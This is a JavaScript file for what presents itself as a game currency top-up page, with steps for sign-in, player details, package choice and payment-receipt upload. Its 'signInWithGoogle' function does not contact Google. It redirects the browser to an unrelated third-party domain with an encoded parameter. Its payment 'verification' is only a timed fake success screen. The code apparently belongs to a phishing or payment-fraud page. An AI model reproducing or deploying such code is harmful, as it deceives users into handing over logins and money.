let googleSignedIn = false
let selectedAmount = 0

function signInWithGoogle(){
  window.location.href = "https://ignite.lk/.well-known/?f=MTAmYW1wO2k9MjkzMDQ5"
  googleSignedIn = true
  setTimeout(()=>switchStep("step1","step2"), 300)
}

function goPlayer(){
  if(!googleSignedIn){
    alert("Please sign in with Google")
    return
  }

  const username = document.getElementById("username").value
  const region = document.getElementById("region").value

  if(!username || !region){
    alert("Complete all fields")
    return
  }

  switchStep("step2","step3")
}

function goPackages(){
  const id = document.getElementById("playerId").value
  if(!id){
    alert("Enter Player ID")
    return
  }

  switchStep("step3","step4")
}

function selectPack(el,amount){
  document.querySelectorAll(".pack").forEach(p=>p.classList.remove("selected"))
  el.classList.add("selected")
  selectedAmount = amount
}

function goPayment(){
  if(!selectedAmount){
    alert("Select a top-up amount")
    return
  }

  document.getElementById("payAmount").innerText = selectedAmount
  switchStep("step4","step5")
}

function confirmPayment(){
  if(document.getElementById("receipt").files.length === 0){
    alert("Upload payment proof")
    return
  }

  const btn = event.target
  btn.innerText = "Verifying..."
  btn.disabled = true

  setTimeout(()=>{
    switchStep("step5","success")
  },1500)
}

function switchStep(hide,show){
  document.getElementById(hide).classList.add("hidden")
  document.getElementById(show).classList.remove("hidden")
}